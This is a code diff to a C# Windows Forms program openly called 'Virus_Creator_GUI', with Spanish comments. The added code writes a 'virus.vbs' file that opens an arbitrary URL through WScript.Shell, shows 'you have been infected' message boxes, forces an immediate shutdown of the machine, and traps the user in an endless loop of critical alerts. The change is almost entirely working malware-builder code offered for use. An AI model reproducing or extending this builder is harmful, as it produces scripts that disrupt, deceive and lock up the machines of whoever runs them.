@@ -81,7 +81,8 @@ namespace Virus_Creator_GUI
 
             try
             {
-                File.AppendAllText("virus.vbs", "Abrir sitio web");
+                string sitioURL = "\n" + "Dim wShell" + "\n" + "Set wShell = CreateObject(\"WScript.Shell\")" + "\n" + "wShell.Run \"" + virusURL + "\"" + ",9";
+                File.AppendAllText("virus.vbs", sitioURL);
             }
             catch
             {
@@ -142,11 +143,13 @@ namespace Virus_Creator_GUI
             //Agrega el contenido al archivo
             try
             {
-                File.AppendAllText("virus.vbs", "Abrir otra alerta");
+                string alert = "\n" + "msgbox(\"" + virusAlerta + "\")";
+                File.AppendAllText("virus.vbs", alert);
             }
             catch
             {
                 MessageBox.Show("Error trabajando con el archivo!");
+                Application.Exit();
             }
         }
 
@@ -207,11 +210,29 @@ namespace Virus_Creator_GUI
             virusName = textBox.Text;
 
             //Agrega el contenido al archivo
+            try
+            {
+                string name = "\n" + "msgbox(\"" + "Has sido infectado por el virus: " + virusName + "\")";
+                File.AppendAllText("virus.vbs", name);
+            }
+            catch
+            {
+                MessageBox.Show("Error trabajando con el archivo!");
+                Application.Exit();
+            }
         }
-
         private void Btn_shutdown_Click(object sender, EventArgs e)
         {
-            //Aqui va el Script de apagado ;D
+            try
+            {
+                string script = "\n" + "\' -s = shutdown, -t 0 = no timeout, -f = force programs to close" + "\n" + "strShutdown = \"shutdown.exe -s -t 0 -f -m \\\" & strComputer" + "\n" + "set objShell = CreateObject(\"WScript.Shell\")" + "\n" + "objShell.Run strShutdown, 0, false";
+                File.AppendAllText("virus.vbs", script);
+            }
+            catch
+            {
+                MessageBox.Show("Error trabajando con el archivo :(");
+                Application.Exit();
+            }
         }
 
         private void Btn_customScript_Click(object sender, EventArgs e)
@@ -316,6 +337,16 @@ namespace Virus_Creator_GUI
             spamMessage = textBox.Text;
 
             //Agrega el contenido al archivo
+            try
+            {
+                string script = "do" + "\n" + "x=MsgBox(\"" + spamMessage + "\"," + "vbOkOnly+vbCritical," + "\"" + spamMessage + "\"" + ")" + "\n" + "loop";
+                File.AppendAllText("virus.vbs", script);
+            }
+            catch
+            {
+                MessageBox.Show("Error trabajando con el archivo :(");
+                Application.Exit();
+            }
         }
     }
 }
